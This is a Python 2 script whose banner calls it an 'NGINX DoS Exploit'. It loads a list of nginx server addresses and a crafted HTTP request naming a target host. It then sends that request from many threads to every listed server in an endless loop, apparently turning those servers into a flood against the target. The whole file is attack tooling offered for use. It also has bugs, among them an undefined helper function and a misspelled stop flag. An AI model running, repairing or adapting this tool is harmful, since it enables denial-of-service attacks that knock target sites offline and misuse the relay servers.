#!/usr/bin/env python


import threading
import re
import sys
import time
import socket
import string
import random
import Queue

c_g = "\033[1;32m"
c_r = "\033[1;31m"
c_y = "\033[1;33m"
c_e = "\033[0m"

target 		= ""
nginx_2 	= []
requests 	= ""
threads = []
num_threads = 40
VERSION = "1.0"

def banner():
	print c_g
	print """
  _   _  ____ ___ _   ___  __  ____       ____  
 | \ | |/ ___|_ _| \ | \ \/ / |  _ \  ___/ ___| 
 |  \| | |  _ | ||  \| |\  /  | | | |/ _ \___ \ 
 | |\  | |_| || || |\  |/  \  | |_| | (_) |__) |
 |_| \_|\____|___|_| \_/_/\_\ |____/ \___/____/ 
                                                
        """
	print c_e
	print "    NGINX DoS Exploit\n"
	print " Coded by Chris Poole | @codingplanets"
	print " "
	print "  http://twitter.com/codingplanets"
	print "_" * 37 + "\n"


def usage():
	banner()
	print "Usage: %s -l [nginx.txt] -t [1.3.3.7] -r [request.txt] -n [threads (default: 40)] " % sys.argv[0]
	print ""
	exit()


class WorkerThread(threading.Thread):
	
	def __init__(self, qin, tid):
		threading.Thread.__init__(self)
		self.qin = qin
		self.tid = tid
		self.kill_received = False
	
	def stop(self):
        	self.kill_recieved = True

	def run(self):
		while not self.kill_received:
			while True:
				try:
					nginx_1 = self.qin.get(timeout=1)

				except Queue.Empty:

					print c_r + "/!\ " + c_r + "No response"
				
				try:
					r = requests.replace("%RANDOM%", gen_rand_string())
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(2)
					s.connect( (nginx_1, 80) )
					s.send(r)
					ret = s.recv(16).strip()
					print c_g + "[Thread '%d' ] Packet => '%s:80' => Response '%s'" % (self.tid, nginx_1, ret) + c_e
					s.close()
					self.qin.task_done()
			
				except:
					print c_g + "/!\ " "Connecting --> '%s' " % nginx_1
					s.close()
				
	
if __name__ == "__main__":

	if "-t" not in sys.argv:
		t_check = False
	else:
		t_check = True

	if "-l" not in sys.argv or "-r" not in sys.argv:
		usage()

	if "-n" in sys.argv:
		num_threads = int(sys.argv[sys.argv.index("-n")+1])

	banner()

	nginx_list 	= sys.argv[sys.argv.index("-l")+1]
	request_f	= sys.argv[sys.argv.index("-r")+1]

	try:
		request_file = open(request_f, "r")
		requests = request_file.read()
		if "Host: " not in requests and not t_check:
			print c_r + "/!\ " + c_e + "'Host: ' field not found in HTTP(s) request file '%s', either set this manually or use '-t www.target.com' in the command line options" % request_f
			exit()
		elif "Host: " in requests and not t_check:
			reg = "(Host: .*)"
			target = re.findall(reg, requests)[0].split(":")[1].strip()

	except:
		print c_r + "/!\ " + c_e,
		print "Error opening request file: '%s'." % request_f
		exit()

	try:
		if t_check:
			target = sys.argv[sys.argv.index("-t")+1]
			requests = requests.strip() + "\r\nHost: %s\r\n\r\n" % target
					
	except:
		pass

	try:
		akami_file = open(nginx_list, "r")
		for i in akami_file.readlines():
			nginx_2.append(i.strip())
		
	except:
		print c_r + "/!\ " + c_e,
		print "Can not open nginx list '%s'." % nginx_list
		exit()


	start_time = time.time()

	print c_y + "[?] " + c_e + " Target: '%s'" % target 
	print c_y + "[?] " + c_e + " Request file: '%s'" % request_f 
	print c_y + "[?] " + c_e + " NGINX list ('%s' IP's): '%s'" % ( len(nginx_2), nginx_list)
	print c_y + "[?] " + c_e + " Threads '%d'\n" % num_threads
 
	x = raw_input(c_r + "/!\ " + c_e + "Are you sure you want to attack with nginx servers\n[Y/N] ")

	if not (x[:1] == "y") or (x[:1] == "Y"):
		print c_r + "/!\ " + c_e + " Exiting..."
		exit()

	while True:
		qin = Queue.Queue()
		try:
			for i in range(0, num_threads):
				worker = WorkerThread(qin, i)
				worker.setDaemon(True)
				worker.daemon = True
				worker.start()
				threads.append(worker)
	
			for ip in nginx_2:
				qin.put(ip)
		
			qin.join()
	
			print c_g + "[*] " + c_e + "nginx's are pinging-back"
			time.sleep(1)
		
		except KeyboardInterrupt:
			
		        print c_r + "/!\ " + c_e + "Ctrl+C captured! Exiting.."
			for t in threads:
				t.stop()
		        sys.exit(0)
